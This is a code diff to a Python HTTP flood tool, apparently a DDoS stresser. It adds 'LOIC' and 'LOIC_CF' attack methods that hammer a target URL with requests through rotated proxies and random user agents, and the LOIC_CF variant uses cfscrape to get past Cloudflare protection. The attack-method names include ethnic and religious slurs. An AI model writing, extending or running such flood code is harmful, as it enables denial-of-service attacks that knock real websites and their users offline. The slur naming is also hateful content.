@@ -128,7 +128,8 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "RAGHEAD", "PAPIST", "TANKIE_SPECIAL", "KACAP",
+        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "TANKIE_SPECIAL",
+        "RAGHEAD", "PAPIST", "KACAP", "LOIC", "LOIC_CF",
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
@@ -722,6 +723,8 @@ class HttpFlood(Thread):
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
             "KACAP": self.KACAP,
+            "LOIC": self.LOIC,
+            "LOIC_CF": self.LOIC_CF,
             "DGB": self.DGB,
             "OVH": self.OVH,
             "AVB": self.AVB,
@@ -866,7 +869,8 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "FUNDIE", 
+        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "TANKIE_SPECIAL", 
+                                            "KACAP", "PAPIST", "RAGHEAD", "LOIC", "LOIC_CF",
                                             "CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
@@ -1081,7 +1085,7 @@ class HttpFlood(Thread):
 
         cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        http = urllib3.PoolManager()
+        #http = urllib3.PoolManager()
         headersx={"Host" : str(self._host),
         "Connection" : "keep-alive",
         "Cache-Control" : "max-age=0",
@@ -1116,7 +1120,7 @@ class HttpFlood(Thread):
 
         cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        http = urllib3.PoolManager()
+        #http = urllib3.PoolManager()
         headersx={"Host" : str(self._host),
         "Connection" : "keep-alive",
         "Cache-Control" : "max-age=0",
@@ -1141,6 +1145,56 @@ class HttpFlood(Thread):
             except:
                 sleep(random.randint(10,15))
         Tools.safe_close(s)
+
+    def LOIC_CF(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        headersx = {'User-Agent': randchoice(self._useragents)}
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        # Attacking
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+               for _ in range(self._rpc):
+                    if pro:
+                         with s.get(url, proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                    else:
+                         with s.get(url, headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(10,15))
+        Tools.safe_close(s)
+
+    def LOIC(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        headersx = {'User-Agent': randchoice(self._useragents)}
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        # Attacking
+        try:
+           for _ in range(self._rpc):
+                if pro:
+                     with requests.get(url, proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                else:
+                     with requests.get(url, headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+        except:
+            sleep(random.randint(10,15))
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -2028,7 +2082,7 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 # get the up-to-date proxies
-                DownloadProxies(proxy_ty, proxy_li)
+                #DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
